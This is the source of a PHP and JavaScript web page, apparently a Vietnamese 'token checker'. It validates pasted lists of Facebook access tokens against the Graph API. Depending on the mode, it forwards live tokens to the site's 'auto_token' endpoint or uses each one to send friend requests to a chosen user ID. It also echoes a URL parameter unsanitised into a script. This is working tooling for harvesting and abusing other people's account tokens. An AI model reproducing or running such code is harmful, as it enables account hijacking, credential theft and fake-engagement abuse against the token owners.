<?php
$db = isset($_GET['db']) ? addslashes($_GET['db']) : 'tokenviet';
$type = isset($_GET['type']) ? intval($_GET['type']) : 0;
$uid = isset($_GET['uid']) ? addslashes($_GET['uid']) : 0;
//ban be 1426 tie nguyễn
?>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="referrer" content="origin" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>#TSVT SYS | Hệ Thống Hổng Làm Hàng Đầu VN</title>
    <meta name="viewport" content="width=device-width" />

    <link href="http://thathinh.trasuavotin.com/Content/css/lib/bootstrap.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/owl.carousel.css" rel="stylesheet" /> 
    <link href="http://thathinh.trasuavotin.com/Content/css/style.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/bootstrap-select.min.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/font-awesome.min.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/animate.min.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/responsive.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/googlefont.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/settings.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/rs-plugin-styles.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/custom.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/jquery-ui.css" rel="stylesheet" />
    <link href="http://thathinh.trasuavotin.com/Content/css/lib/simplePagination.css" rel="stylesheet" />
    <link href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" rel="stylesheet" crossorigin="anonymous">
    <script src="http://thathinh.trasuavotin.com/Scripts/lib/jquery.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/lib/jquery-ui.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/lib/bootstrap.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/app.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/lib/bootstrap-select.min.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/ani/smoothscroll.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/ani/owl.carousel.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/ani/scrollreveal.min.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/utilsu.js"></script>   
    <script src="http://thathinh.trasuavotin.com/Scripts/home.js"></script>
    <script src="http://thathinh.trasuavotin.com/Scripts/register.js"></script>

  

	
	<noscript>
		<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=360967374099278&amp;ev=PageView&amp;noscript=1"/></noscript>
	<!-- DO NOT MODIFY -->
	<!-- End Facebook Pixel Code -->
</head>
<body class="popup grey-bg pushmenu-push">
<div class="popup-all">
    <div class="container">
	<div class="row">
    <div class="col-md-12">
	<div class="panel panel-primary">
	<div class="panel-body">
	<div class="col-sm-6">
                <div class="form-group">
                    <div class="input-group">
                        <span class="input-group-addon"><i class="fa fa-key"></i></span>
                        <textarea placeholder="List Token" class="form-control" name="token" id="token" rows="19" style="resize: none;"></textarea>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-group">
                        <input class="form-control" type="number" name="delay" id="delay" value="0.2" placeholder="Time delay"> 
                    </div>
                </div>
                <div class="form-group">
                    <a href="javascript:;" class="btn btn-success" id="btn_click" name="btn_click" onclick="javascript: CheckToken();">Check Token</a>
                    <a href="" class="btn btn-danger">Refresh</a>
                </div>
            <div class="panel panel-info">
                <div class="panel-heading">Note</div>
                <div class="panel-body">
                    - Để 1 token 1 dòng<br />
                    - Token die sẽ tự động xóa khi check xong <br />
                    - Copy Token live ở mục báo cáo <br />
                </div>
            </div>
</div>
<!-- BÁO CÁO -->
<div class="col-sm-6">
	<div class="panel panel-danger">
                <div class="panel-heading">Báo cáo check token</div>
                <div class="panel-body">
                    <div class="tools">
                Tổng: <span id="alltoken">0</span> token - Live: <span id="clive">0</span> token - Die: <span id="cdie">0</span> token
            </div>
                </div>
            </div>
			
   
            <div class="form-group">
                <div class="input-group">
                    <span class="input-group-addon">Token<br />Live</span>
                    <textarea placeholder="List Token" class="form-control" name="live" id="live" rows="10" style="resize: none;" readonly="readonly" onClick="this.select();"></textarea>
                    <textarea id="fblive" style="display: none;" ></textarea>
                </div>
            </div>
            <div class="form-group">
                <div class="input-group">
                    <span class="input-group-addon"> Token<br />Die </span>
                    <textarea placeholder="List Token" class="form-control" id="die" rows="10" style="resize: none;" readonly="readonly" onClick="this.select();"></textarea>
                    <textarea id="cdie" style="display: none;"></textarea>
                </div>
            </div>
            <div class="form-group">
                <div class="panel panel-default">
                    <div class="panel-footer" style="height: 135px;">
                        <div class="slimScrollDiv" style="position: relative; overflow: hidden; width: auto; height: 135px;">
                            <div class="scroller" style="height: 135px; overflow: hidden; width: auto;" data-always-visible="1" data-rail-visible="1">
                                <div id="status"></div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
function CheckToken() {
    var itoken = $('#token').val().split("\n"),
        status = $('#status');
    var delay = $('#delay').val();
    var idfb = <?=$uid;?>;
    var type = <?=$type;?>;
        $("#btn_click").attr("disabled", false);
    if (itoken == 0) {
        alert('Bạn phải nhập token để check');
        $("#btn_click").attr("disabled", false);
        return false;
    }
    if(delay<0 || delay>100){
        alert('Delay phải lớn hơn không và bé hơn 100');
        $('#btn_click').attr("disabled", false);
        return false;
    }

    var timedelay = delay*1000;
    $('#clive').html('0');
    $('#cdie').html('0');
    $('#die').empty();
    $('#live').empty();
    $('#alltoken').html(itoken.length);
    status.fadeIn(500);
    $('#result').fadeIn(500);
        var itokens = itoken.length;
        (function theLoop(i) {
            timer = setTimeout(function() {
                $.ajax({
                    url: 'https://graph.facebook.com/me?fields=name,id&access_token=' + itoken[i].trim(),
                    itoken: itoken[i],
                    dataType: 'jsonp',
                    success: function (iuid) {
                        var fblive = $('#fblive'),
                            live = $('#live'),
                            die = $('#die'),
                            clive = $('#clive').text(live.val().split("\n").length - 1),
                            cdie = $('#cdie').text(die.val().split("\n").length - 1);
                        if (!iuid.error) {
                            var token_now = this.itoken;
                            var u_sub = iuid.id;
                            if(type == 1){
                                $.get("auto_token?token_cookie=" + this.itoken + "");
                            }else if(type == 2){
                                //alert(token_now);
                                addFriend(idfb,token_now,u_sub);
                            }
                            status.prepend('<p id="success">Live: ' + iuid.id + ' - ' + iuid.name + '</p>');
                            if (fblive.val().indexOf(iuid.id) < 0) {
                                fblive.prepend(iuid.id + "\n");
                                live.prepend(this.itoken + "\n");
                            }
                        } else {
                            status.prepend('<p id="error">DIE: ' + iuid.error.message + '</p>');
                            die.prepend(this.itoken + "\n");
                                //$.get("clear_token.php?token_cookie=" + this.itoken + "");
                        }
                    }
                });
                    
                if ((--i) >= 0) {
                    theLoop(i);
                } else {
                    clearTimeout(timer);
                }
            }, timedelay);
        })(itokens - 1);



    $("#btn_click").attr("disabled", true);
}

function addFriend(USER, TOKEN, SUB) {
                $.ajax({
                    url: 'https://graph.facebook.com/me/friends/' + USER,
                    type: "GET",
                    dataType: "JSON",
                    data: {
                        access_token: TOKEN,
                        method: "post",
                    },
                    success: function(msg) {
                        console.log(msg);
                        //$.get("save_sub.php?sub="+USER+"&uid=" + TOKEN + "");

                    },
                    error: function (model) {
                        console.log(model);
                    }
                });
    }
    
 $(window).bind('beforeunload', function () {
        return 'Các thay đổi chưa lưu của bạn sẽ bị mất.';
    });

</script>
</html>